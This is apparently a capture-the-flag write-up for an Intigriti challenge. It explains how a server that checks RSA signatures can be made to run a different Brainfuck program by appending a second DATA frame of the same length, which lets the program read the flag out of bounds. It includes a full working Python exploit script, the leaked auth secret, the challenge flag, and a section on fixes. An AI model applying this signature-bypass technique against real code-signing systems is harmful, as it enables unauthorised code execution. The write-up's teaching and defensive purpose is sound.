# The signature was valid. The code wasn't.

**Intigriti 1126 - Super Fast Server: how a valid RSA-2048 signature ran my Brainfuck program**
 
**Flag:** `INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}`

---

## TL;DR

The server lets a client upload "RSA-2048 signed code" over a custom protocol. It verifies the signature over one part of its buffer, then executes code pointed to by a *different* offset in that same buffer.

`HELP` hands you a correctly signed sample: a small Brainfuck interpreter plus a harmless Brainfuck program. If you replay the sample and then add a **second `DATA` frame of the same length**, the signature still verifies — because the hash still covers the original `CODE` + first `DATA` — but the interpreter now runs *your* program. That program walks the Brainfuck tape 256 bytes forward into thread-local storage, where the flag was just loaded, and prints it.

No brute force, no key recovery. The signature is valid. The bug is that the server checks one thing and runs another.

**[ IMAGE v1 — place `visuals/v1.png` here ]**
![The solve in four moves](visuals/v1.png)

*The whole solve in four moves: download the binary, get the signed sample, append a same-length `DATA`, and walk the Brainfuck tape into TLS.*

---

## 1. What we are attacking

The challenge site is:

```
https://challenge-1126.challenges.intigriti.io/
```

It looks like a tiny file-hosting page for a program called **Super Fast Server**. The changelog is the first useful thing on the site:

- Version 2.0.0 added a custom protocol, "protected by a very good secret to allow execution of RSA-2048 signed code".
- Version 2.0.1 added POST request parsing.

**[ IMAGE changelog — place `visuals/1.png` here ]**
![The changelog's RSA-2048 hint](visuals/1.png)

*The Version 2.0.0 changelog points directly at the custom protocol and RSA-2048 signed code.*

That is a very direct hint: there is a second service speaking a custom binary protocol, and it is reachable through HTTP POST.

The goal is the usual one: read the flag from the server.

---

## 2. A short primer (skip if you already know this)

I want this write-up to be readable even if you have never reversed a binary or written a Brainfuck program, so here are the concepts the exploit uses, in plain language.

### 2.1 ELF, strings, and disassembly

Linux programs are usually **ELF** files. `file` tells you what you have:

```
$ file superfastserver
superfastserver: ELF 64-bit LSB pie executable, x86-64, ...
```

`strings` prints readable text found inside the binary. It is not decompilation, but binaries often leak paths, error messages, keys, and secrets:

```
$ strings -a superfastserver
/the_real.flag
/custom_protocol
SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_...
```

The last line is a 106-byte authentication code used by the custom protocol. It is sitting inside the binary that the web server hands to anyone who asks. So the protocol's "very good secret" is public.

`objdump -d` (or a disassembler such as Ghidra) turns the machine code back into assembly. That is how we find out what each protocol command actually does.

### 2.2 Little-endian numbers

The protocol sends 32-bit lengths as **little-endian**: the least significant byte first.

```
0x000001a8 = 424
little-endian bytes: a8 01 00 00
```

In Python:

```python
struct.pack("<I", 424)   # b'\xa8\x01\x00\x00'
struct.unpack("<I", b'\xa8\x01\x00\x00')[0]   # 424
```

If you read those four bytes as big-endian, you get a huge nonsense number. This matters when parsing the protocol.

### 2.3 What an RSA signature actually proves

A signature does **not** encrypt the message. The server does something like:

1. Hash the message with SHA-256 → 32-byte digest.
2. Verify the 256-byte RSA signature against that digest using a public key.

Only the holder of the private key can produce a signature that verifies. The public key is embedded in the server, so the server can check signatures but cannot create them.

The important consequence: **if one byte of the hashed message changes, the digest changes and the signature fails.** That is exactly why the obvious attack — edit the signed Brainfuck program — does not work. We need to find a way to run different bytes *without* changing the bytes that are hashed.

### 2.4 mmap, mprotect, and "signed code"

`mmap` asks the kernel for a chunk of memory. `mprotect` changes its permissions. The server does roughly:

```c
void *code = mmap(NULL, 0x400, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
memcpy(code, payload, length);
mprotect(code, 0x400, PROT_READ | PROT_EXEC);
```

So the `CODE` payload is not a script or an ELF file — it is raw x86-64 machine code. The server copies it into memory, marks it executable, and later calls it like a function. This is a tiny JIT (just-in-time) loader.

The signed sample's `CODE` payload is a Brainfuck interpreter written in machine code.

### 2.5 Brainfuck in thirty seconds

Brainfuck has eight commands and a "tape" of bytes with a movable pointer:

| Command | Meaning |
|---|---|
| `>` | move pointer right |
| `<` | move pointer left |
| `+` | increment byte at pointer |
| `-` | decrement byte at pointer |
| `.` | print byte at pointer |
| `,` | read one byte into pointer |
| `[` | jump past matching `]` if current byte is zero |
| `]` | jump back to matching `[` if current byte is nonzero |

A normal interpreter allocates a tape and checks that the pointer stays inside it. This interpreter does not. It receives a pointer and simply adds or subtracts 1 as the program says. That missing bounds check is the second half of the exploit.

### 2.6 `fs` and thread-local storage

On x86-64 Linux, the `fs` segment register points at the current thread's **thread-local storage** (TLS) area. Each connection is handled by its own thread. The server loads the flag into that thread's TLS, then starts the Brainfuck interpreter with the tape pointer set to `fs - 0x160`.

The flag is stored at `fs - 0x60`. The distance is:

```
(fs - 0x60) - (fs - 0x160) = 0x100 = 256
```

So a Brainfuck program that moves right 256 times is standing on the first byte of the flag. The interpreter will happily let it go there because it never checks bounds.

---

## 3. Recon: the website and the binary

The site serves its own server binary. That is unusual, and it is the first gift:

```bash
curl -s https://challenge-1126.challenges.intigriti.io/superfastserver -o superfastserver
file superfastserver
```

`strings` gives us the important pieces:

```
/the_real.flag
/custom_protocol
SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033
```

**[ IMAGE strings — place `visuals/2.png` here ]**
![strings output leaking the auth code](visuals/2.png)

*The downloadable binary leaks the auth code, the intended flag path, and the protocol endpoint.*

We also see protocol responses such as `AUTH`, `NAKH`, `NAKL`, `PONG`, `NAKS`, `NAKC`, `NAKO`, `NAKR`, `LEET`, and `INVC`. Those are excellent search anchors when reading the disassembly.

The binary is a stripped PIE executable, so function names are gone. We have to follow the code by its behavior and by references to those strings.

### 3.1 The HTTP endpoint that hides a second server

The normal web server serves static files. There is also a special path, `/custom_protocol`, which is not a file. In the disassembly, around `0x7388`, the server compares the request path with `/custom_protocol`; if it matches, it:

1. Finds the HTTP body after the blank line (`\r\n\r\n`).
2. Opens a TCP socket to `127.0.0.1` on port `5001` (`0x1389`).
3. Sends the raw body to that socket.
4. Sleeps for 2 seconds.
5. Reads up to `0x2000` bytes from the internal socket.
6. Sends those bytes back as the HTTP response body.

So the custom protocol is bound to localhost only, but `/custom_protocol` is a public bridge to it. Any HTTP client can speak the binary protocol through that bridge.

**[ IMAGE v2 — place `visuals/v2.png` here ]**
![The public proxy and the internal protocol](visuals/v2.png)

*The public web tier forwards raw POST bodies to the internal protocol server on `127.0.0.1:5001`. The downloadable binary leaks the auth code and the flag path.*

That also explains an annoyance you may see: the internal listener occasionally returns `503 Service Unavailable`, and the proxy is slow because of the fixed 2-second sleep. Retrying the same request usually works.

---

## 4. The custom protocol, frame by frame

Before any frames, the client sends the 106-byte authentication code raw. The server reads exactly `0x6a` (106) bytes and compares them. On success it replies with a 4-byte `ACK\0`.

Then each command is a frame:

```
+------+---------------------+--------+----------------------+
| 'w'  | length (4 bytes LE) | magic  | payload (length)     |
+------+---------------------+--------+----------------------+
  1              4               4            length
```

- `'w'` is the literal byte `0x77`.
- `length` is a 32-bit little-endian integer.
- `magic` is a 4-byte command name such as `CODE`, `DATA`, `SIGN`, `EXEC`, `HELP`, `PING`, or `1337`.
- The payload is exactly `length` bytes.

Limits enforced by the server:

- One frame payload may not exceed `0x400` (1024) bytes.
- The total buffer may not exceed `0x2000` (8192) bytes.
- If the first byte is not `w`, the server replies `NAKH`.
- If a frame is too long, it replies `NAKL`.

**[ IMAGE v3 — place `visuals/v3.png` here ]**
![One protocol frame](visuals/v3.png)

*One protocol frame: literal `'w'`, a 32-bit little-endian length, a four-byte magic such as `CODE`, and the payload.*

### 4.1 The server keeps offsets, not separate buffers

This is the key implementation detail.

The server has one big buffer and a `cursor` that starts at 0. When a frame arrives, it copies the payload to `buffer + cursor`, then each command handler stores that cursor value as its offset:

- `CODE` stores `CODE_offset = cursor` and `CODE_len = length`.
- `DATA` stores `DATA_offset = cursor` and `DATA_len = length`.
- `SIGN` stores `SIGN_offset = cursor` and `SIGN_len = length`.
- After the frame is processed, `cursor += length`.

So the buffer is literally the concatenation of the frames in the order you send them. If you send `CODE`, `DATA`, `SIGN`, the layout is:

```
[ CODE ][ DATA ][ SIGN ]
```

The `CODE` handler additionally maps an executable page, copies the `CODE` payload there, and marks it executable. The code page is separate from the protocol buffer, but the offsets still refer to the protocol buffer.

### 4.2 Command behavior

| Magic | What the server does | Reply |
|---|---|---|
| `PING` | no-op | `PONG` |
| `1337` | no-op | `LEET` |
| `CODE` | store offset/length; `mmap` 0x400, copy payload, `mprotect` RX | `ACK\0` |
| `DATA` | store offset/length | `ACK\0` |
| `SIGN` | store offset/length | `ACK\0` |
| `EXEC` | verify signature and run code | `ACK\0`, `NAKS`, `NAKC`, `NAKO`, `NAKR` |
| `HELP` | send a 0x458-byte pre-signed sample | sample |
| anything else | reply `INVC`, zero the frame slot | `INVC` |

A minimal Python client looks like this:

```python
import socket, struct

SECRET = b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"

def frame(magic, payload):
    return b"w" + struct.pack("<I", len(payload)) + magic + payload

s = socket.create_connection(("127.0.0.1", 5001))
s.sendall(SECRET)
print(s.recv(4))          # b'ACK\x00'
s.sendall(frame(b"PING", b""))
print(s.recv(4))          # b'PONG'
```

The public version is the same bytes, but sent as the body of `POST /custom_protocol`.

---

## 5. `HELP` gives us a valid signed sample

The easiest way to see a valid request is to ask for one. Send the authentication code followed by a `HELP` frame:

```python
body = SECRET + frame(b"HELP", b"")
```

The response is 1112 bytes (`0x458`). It contains four frames:

| Frame | Length field | Actual payload | Starts at |
|---|---:|---:|---:|
| `CODE` | 400 | 396 | 0 |
| `DATA` | 428 | 424 | 405 |
| `SIGN` | 260 | 256 | 838 |
| `EXEC` | 4 | 0 | 1103 |

Notice the off-by-four: the length fields in the `HELP` sample are **payload + 4**. In normal client frames, the length is just the payload size. If you parse the `HELP` blob with the normal rule, the next frame starts four bytes too late and everything looks like garbage. Subtract 4 when parsing this sample:

```python
payload = blob[off + 9 : off + 9 + (length_field - 4)]
off += 9 + (length_field - 4)
```

The sample is a complete, correctly signed request:

- `CODE` (396 bytes) is a Brainfuck interpreter in x86-64 machine code.
- `DATA` (424 bytes) is an ordinary Brainfuck program that prints a banner.
- `SIGN` (256 bytes) is an RSA-2048 signature over the SHA-256 hash of `CODE || DATA`.
- `EXEC` (0 bytes) tells the server to verify and run it.

If you replay the sample unchanged, the server verifies the signature and runs the signed interpreter on the signed banner. Nothing bad happens. The sample exists so developers can see a working request; it also gives an attacker a valid signature for free.

---

## 6. Reversing `EXEC`: the check and the call disagree

This is the whole vulnerability, so it is worth reading slowly.

The `EXEC` handler (around `0x6564` in the disassembly) does roughly this:

```c
/* 1. Make sure the required frames exist. */
if (sign_offset == -1)          { send("NAKS"); return; }
if (code_offset == -1)          { send("NAKC"); return; }
if (data_offset < code_offset)  { send("NAKO"); return; }

/* 2. Hash CODE + DATA as one contiguous block. */
sha256(buffer + code_offset, code_len + data_len, digest);

/* 3. Verify the RSA-2048 signature over that digest. */
if (!rsa_verify(public_key, buffer + sign_offset, digest)) {
    send("NAKR");
    return;
}

/* 4. Signature is good. Run the interpreter. */
send("ACK");
code(buffer + data_offset,   /* rdi: Brainfuck program */
     fs - 0x160,             /* rsi: tape pointer     */
     putchar_helper,         /* rdx: output function  */
     getchar_helper);        /* rcx: input function   */
```

Read step 2 and step 4 again:

- Step 2 hashes starting at **`code_offset`**, for **`code_len + data_len`** bytes.
- Step 4 calls the code at **`buffer + data_offset`**.

Those are two different offsets. The signature covers one region; the interpreter is fed a pointer to another region. The `DATA` handler updates `data_offset` every time a `DATA` frame arrives, while the hash length only depends on `data_len`.

In the signed sample, `CODE` and `DATA` are adjacent:

```
buffer:  [ CODE 396 ][ DATA 424 ][ SIGN 256 ]
          ^code_offset            ^sign_offset
          |------ 820 bytes hashed ------|
```

Changing the first `DATA` would change the hashed bytes and break the signature. Changing `data_len` would change the hash length and break the signature. But **adding a second `DATA` frame** does neither, as long as its length is the same.

---

## 7. The trick: append a second `DATA`, do not edit the first

Send the signed sample exactly as it is, then append another `DATA` frame of 424 bytes containing our program, then send `EXEC`:

```
AUTH
w <396> CODE  <signed interpreter>
w <424> DATA  <signed banner>
w <256> SIGN  <valid signature>
w <424> DATA  <our Brainfuck program>
w <0>   EXEC
```

The buffer now looks like this:

```
offset 0        396        820       1076       1500
       +--------+----------+---------+----------+
       | CODE1  | DATA1    | SIGN    | DATA2    |
       | 396    | 424      | 256     | 424      |
       +--------+----------+---------+----------+
       ^code_offset         ^sign_offset        ^data_offset
       |------ SHA-256 hashes these 820 bytes ------|
```

**[ IMAGE v4 — place `visuals/v4.png` here ]**
![Signed sample versus exploit request](visuals/v4.png)

*The signature hashes the same 820 bytes in both requests. The second `DATA` is outside that region, so the digest stays valid while `DATA_offset` — the pointer `EXEC` uses — moves to our program.*

What happens at `EXEC`:

- `code_offset` is still 0.
- `code_len` is still 396.
- `data_len` is still 424, because the second `DATA` has the same length.
- Therefore `sha256(buffer + 0, 396 + 424)` hashes exactly `CODE1 || DATA1`, the same bytes that were signed. The signature verifies.
- `data_offset` is now 1076, the start of `DATA2`, because the `DATA` handler overwrote it.
- The call is `code(buffer + 1076, ...)`, so the signed interpreter runs **our** program.

The check `data_offset < code_offset` passes because `1076 >= 0`.

This is the entire bypass. The signature is not broken; the server simply verifies one object and uses another, like a guard checking one person's ID and then letting a different person through the door.

### Why the second `DATA` must have the same length

The hash length is `code_len + data_len`. `data_len` is whatever the most recent `DATA` frame said. If the second `DATA` were 500 bytes, the server would hash 396 + 500 = 896 bytes starting at `code_offset`, which would include the signature bytes and part of `DATA2`. The digest would differ and the signature would fail. Keeping the length at 424 keeps the hash range exactly where it was.

### Why the second `DATA` must be outside the hashed range

Because we append it after `SIGN`, it starts at 1076, well past the 820-byte hashed region. The signed bytes are untouched.

### Why not just modify the signed `DATA`?

Because it is inside the 820-byte hashed region. Even one changed byte produces a different SHA-256 digest and the RSA verification fails with `NAKR`. The signature is doing its job; the bug is the pointer used afterward.

---

## 8. Reading the flag with a Brainfuck out-of-bounds read

Now we need a program that runs in the signed interpreter and prints the flag. The interpreter is called with:

- `rdi` = pointer to our Brainfuck source (`DATA2`),
- `rsi` = `fs - 0x160`, the tape pointer,
- `rdx` = an output helper,
- `rcx` = an input helper.

The interpreter itself is simple. Disassembling the 396-byte `CODE` payload shows the classic loop:

```
read program[i]
if program[i] == 0: stop
if '>': tape += 1
if '<': tape -= 1
if '+': (*tape) += 1
if '-': (*tape) -= 1
if '.': putchar(*tape)
if ',': *tape = getchar()
if '[' / ']': loop handling
i += 1
```

There is no check that `tape` stays inside any buffer. It is just a pointer.

### Where the flag lives

When a connection thread starts, the server reads `/the_real.flag` into an 81-byte stack buffer and copies it into the thread's TLS at `fs - 0x60`. The flag itself is 47 bytes; the rest of the 81-byte area is zero padding.

The interpreter's tape starts at `fs - 0x160`. The difference is 256 bytes, so:

```
'>' * 256
```

moves the tape pointer from `fs - 0x160` to `fs - 0x60`, the first byte of the flag.

**[ IMAGE v5 — place `visuals/v5.png` here ]**
![The Brainfuck tape and the TLS flag buffer](visuals/v5.png)

*The interpreter's tape starts at `fs-0x160`; the flag buffer is at `fs-0x60`. There is no bounds check, so 256 `>` commands walk straight into the connection thread's TLS.*

Then:

```
'.'
```

prints `I`, and

```
'>.'
```

repeated 83 times prints the remaining 83 bytes: the rest of the flag plus NUL padding. That is 84 bytes total, which is more than enough for a 47-byte flag.

The complete program is:

```python
evil = b">" * 256 + b"." + b">." * 83
evil = evil.ljust(424, b" ")
```

Why pad with spaces? Brainfuck ignores every character that is not one of its eight commands. Spaces are safe no-ops. Do **not** pad with NUL bytes: the interpreter treats a NUL as the end of the program and stops early. And the total must stay 424 bytes so `data_len` does not change.

Why 83 extra bytes instead of exactly 46? The flag's exact length is not known until you leak it. Printing 84 bytes guarantees the closing `}` and some padding are included; a regex can trim the result.

---

## 9. The full exploit, line by line

Here is the complete script. It uses only the Python standard library.

```python
import urllib.request, struct, re

BASE = "https://challenge-1126.challenges.intigriti.io"
AUTH = b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"

def post(body):
    req = urllib.request.Request(
        BASE + "/custom_protocol",
        data=body,
        method="POST",
        headers={"Content-Type": "application/octet-stream"},
    )
    return urllib.request.urlopen(req, timeout=20).read()

def frame(magic, payload):
    return b"w" + struct.pack("<I", len(payload)) + magic + payload

# 1) Ask HELP for the already-signed sample (auth first).
blob = post(AUTH + frame(b"HELP", b""))

# The HELP blob uses length = payload + 4, so subtract 4 while parsing.
off = blob.index(b"w")
cmds = {}
while off < len(blob) and blob[off:off+1] == b"w":
    ln = struct.unpack("<I", blob[off+1:off+5])[0]
    magic = blob[off+5:off+9]
    payload = blob[off+9:off+9+ln-4]
    cmds[magic] = payload
    off += 9 + (ln - 4)

code, data, sign = cmds[b"CODE"], cmds[b"DATA"], cmds[b"SIGN"]

# 2) Our Brainfuck program.
#    Tape starts at fs-0x160; the flag is at fs-0x60, which is tape+0x100.
#    Move 256 cells right, print one byte, then print 83 more.
evil = (b">" * 256 + b"." + b">." * 83).ljust(len(data), b" ")

# 3) Replay the signed CODE/DATA/SIGN, then add a second DATA of the
#    same length. The hash still covers CODE+DATA1, but DATA_offset
#    now points at our program.
body = (
    AUTH
    + frame(b"CODE", code)
    + frame(b"DATA", data)
    + frame(b"SIGN", sign)
    + frame(b"DATA", evil)
    + frame(b"EXEC", b"")
)

resp = post(body)
print(resp)
print(re.findall(rb"INTIGRITI\{[^}]*\}", resp))
```

What each block does:

1. **`post`** sends a raw byte body to the public proxy. The proxy forwards it to the internal protocol server. We use `application/octet-stream` because the body is not JSON or form data.
2. **`frame`** builds one protocol frame: literal `w`, little-endian payload length, 4-byte magic, payload. Our own frames use the true payload length (not the `HELP` sample's off-by-four convention).
3. **The `HELP` request** is `AUTH + frame(HELP, "")`. The server authenticates us, then returns the signed sample. We parse the four frames, compensating for the sample's `payload + 4` length fields.
4. **`evil`** is the Brainfuck program described above, padded to exactly the same length as the signed `DATA` (424 bytes).
5. **The exploit body** is the signed sample followed by the second `DATA` and `EXEC`. The order is deliberate:
   - `CODE1` at offset 0,
   - `DATA1` at offset 396,
   - `SIGN` at offset 820,
   - `DATA2` at offset 1076,
   - `EXEC` at offset 1500 (empty).
6. **`post`** sends it and `re.findall` extracts the flag.

### Why the signature still verifies

At `EXEC`:

- `code_offset = 0`
- `code_len = 396`
- `data_len = 424` (the second `DATA` length)
- `sign_offset = 820`
- `data_offset = 1076`

The server hashes `buffer + 0` for `396 + 424 = 820` bytes. Those bytes are exactly `CODE1 || DATA1`, unchanged. The RSA signature over that digest is still valid. Then it calls the interpreter at `buffer + 1076`, which is `DATA2`.

### A note on retries

The internal listener occasionally returns `503 Service Unavailable`, and the proxy has a fixed 2-second sleep. If the first run fails with 503, run the same script again. The payload is deterministic; nothing needs to change.

---

## 10. The real response

A successful run returns:

```
ACK\0ACK\0ACK\0ACK\0ACK\0INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}\0\0\0...
```

There are five `ACK\0` replies:

1. `CODE`
2. `DATA` (signed)
3. `SIGN`
4. `DATA` (ours)
5. `EXEC`

**[ IMAGE v6 — place `visuals/v6.png` here ]**
![The live terminal response](visuals/v6.png)

*Five `ACK`s — `CODE`, `DATA`, `SIGN`, `DATA2`, `EXEC` — then the Brainfuck output and the flag.*

After the fifth `ACK`, the signed Brainfuck interpreter runs our program. The `.` command prints `I`, then the `>.` pairs print the rest of the flag and the NUL padding. The `INTIGRITI{...}` substring is the flag:

```
INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}
```

---

## 11. Root cause

The vulnerability is a **verification/execution mismatch**:

- The signature is computed over `buffer + code_offset`, length `code_len + data_len`.
- The code is invoked with `buffer + data_offset`.
- `data_offset` is attacker-controlled and is updated by every `DATA` frame, while the signed bytes stay untouched.

The server author probably intended `CODE` and `DATA` to be a fixed pair: hash both, then run the code with the data that was hashed. But because the offsets are stored separately and `DATA` can appear more than once, the pair that is verified and the pair that is executed can diverge.

The cryptography itself is fine. The logic around it is not. That is the lesson: a valid signature only means "these exact bytes were approved", not "whatever pointer you use later was approved".

There are also several defense-in-depth failures that made the challenge easier:

- The server binary is downloadable, so the protocol auth secret and the flag path are public.
- The internal protocol is exposed through a public HTTP proxy.
- The Brainfuck interpreter has no tape bounds checks.
- `HELP` hands out a valid signed sample for free.

None of those is the core bug, but together they turn a signed-code feature into a flag printer.

---

## 12. How to fix it

The fix is to make the verifier and the executor agree on the exact bytes:

1. **Verify and execute the same region.** Do not use a mutable `data_offset` for the call. After verification, compute the program pointer from the same `code_offset` / `code_len` / `data_len` values that were hashed, or store a single `program` struct containing the verified offsets and use it for both steps.
2. **Reject duplicate frames.** Allow exactly one `CODE`, one `DATA`, and one `SIGN` per request. A second `DATA` should be an error, not a silent offset update.
3. **Bound the Brainfuck tape.** Allocate a fixed tape and check `tape >= tape_start && tape < tape_end` on every `>` and `<`; return an error or wrap instead of walking into TLS.
4. **Do not serve the server binary.** The auth secret, the flag path, and the public key should not be downloadable. Even if the secret is only a speed bump, it should not be public.
5. **Do not expose the internal protocol through a public proxy.** `/custom_protocol` should require real authentication, or the internal service should not be reachable from the web tier at all.
6. **Use a canonical signed structure.** Sign a serialized `{code, data}` object, not two ad-hoc offsets in a shared buffer. Then verify and execute from the deserialized, immutable object.


---

## 13. What I learned

- **Read from input to `call`.** The interesting question is not "does it verify a signature?" but "what exactly does it verify, and what exactly does it use afterward?"
- **Signatures bind bytes, not intentions.** If the executor can be pointed at different bytes, the signature's guarantee is irrelevant.
- **Offsets are dangerous when they are mutable.** Two variables that are supposed to describe one object (`code_offset`, `data_offset`) can drift apart.
- **Interpreters need bounds checks.** A tape pointer is not a license to read process memory.
- **`HELP` can be a vulnerability.** A pre-signed sample is a valid signature for free; it is exactly the artifact an attacker needs to start experimenting.
- **Read the changelog.** "RSA-2048 signed code" told me where to look before I opened the binary.


The exploit in one sentence: replay the signed `CODE` + `DATA` + `SIGN` sample, append a second same-length `DATA` containing `'>' * 256 + '.' + '>.' * 83`, send `EXEC`, and read the flag from the Brainfuck tape's out-of-bounds walk into TLS.
